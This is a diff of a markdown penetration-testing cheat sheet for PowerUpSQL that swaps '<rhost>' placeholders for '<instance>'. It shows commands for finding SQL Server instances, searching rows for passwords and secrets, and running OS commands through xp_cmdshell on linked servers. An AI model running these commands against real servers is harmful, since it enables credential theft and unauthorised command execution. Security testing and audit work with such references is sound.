@@ -13,41 +13,41 @@ Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads
 
 ### get information from specific instance
 ```
-Get-Sqlserverinfo -instance <rhost>
+Get-Sqlserverinfo -instance <instance>
 ```
 
 ### scan for misconfiguration
 ```
-Invoke-sqlaudit -instance <rhost>
+Invoke-sqlaudit -instance <instance>
 ```
 
 ### search database rows for specific keywords (NoDefaults skip default tables)
 ```
-Get-SQLColumnSampleData –Verbose –Keyword "secret,password" –SampleSize 10 –NoDefaults -Instance <rhost>
+Get-SQLColumnSampleData –Verbose –Keyword "secret,password" –SampleSize 10 –NoDefaults -Instance <instance>
 ```
 
 ### execute command
 ```
-Invoke-SQLOSCmd -Instance '<rhost>,1433' -Command '<command>' -RawResults
+Invoke-SQLOSCmd -Instance <instance> -Command '<command>' -RawResults
 ```
 
 ### execute query
 ```
-Get-SQLQuery -Instance '<rhost>,1433' -Query 'SELECT * FROM master..sysservers'
+Get-SQLQuery -Instance <instance> -Query 'SELECT * FROM master..sysservers'
 ```
 
 ### scan for linked databases
 ```
-Get-SQLServerLinkCrawl -Instance '<rhost>,1433'
+Get-SQLServerLinkCrawl -Instance <instance>
 ```
 
 ### execute commands on linked instances
 ```
-Get-SQLServerLinkCrawl -Instance <rhost> -Query "exec master..xp_cmdshell '<command>'"
+Get-SQLServerLinkCrawl -Instance <instance> -Query "exec master..xp_cmdshell '<command>'"
 ```
 
-### excute command on linked mssql instance via rhost (xp_cmdshell can not be enabled by OpenQuery)
+### excute command on linked mssql instance via instance (xp_cmdshell can not be enabled by OpenQuery)
 ```
-Get-SQLServerLinkCrawl -Instance '<rhost>,1433' -Query "exec master..xp_cmdshell '<command>' "
+Get-SQLServerLinkCrawl -Instance <instance> -Query "exec master..xp_cmdshell '<command>' "
 ```
 
